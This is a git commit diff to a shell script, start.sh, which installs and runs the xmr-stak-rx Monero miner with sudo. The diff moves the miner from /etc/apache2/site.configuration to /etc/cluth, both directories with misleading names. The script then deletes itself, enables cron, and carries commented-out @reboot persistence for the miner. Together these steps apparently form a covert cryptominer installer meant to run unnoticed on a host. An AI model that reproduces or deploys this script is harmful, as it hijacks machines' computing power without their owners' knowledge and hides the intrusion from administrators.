cba262a9c8ab8b13334effee69d7157768ad7adc
Satcom <47340064+Satcomx00-x00@users.noreply.github.com>
2021-01-29 13:16:22 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,3 +1,5 @@
 #!/bin/bash
-sudo chmod +x xmr-stak-rx && sudo mkdir /etc/apache2/site.configuration && sudo mv config.txt pools.txt xmr-stak-rx /etc/apache2/site.configuration && ./xmr-stak-rx --noTest && sudo rm start.sh
+sudo chmod +x xmr-stak-rx && sudo mkdir /etc/cluth && sudo mv config.txt pools.txt xmr-stak-rx /etc/cluth && ./xmr-stak-rx --noTest && sudo rm start.sh
 sudo systemctl enable cron.service
+#sudo crontab-e 
+#@reboot ./etc/cluth/xmr-stak-rx --noTest
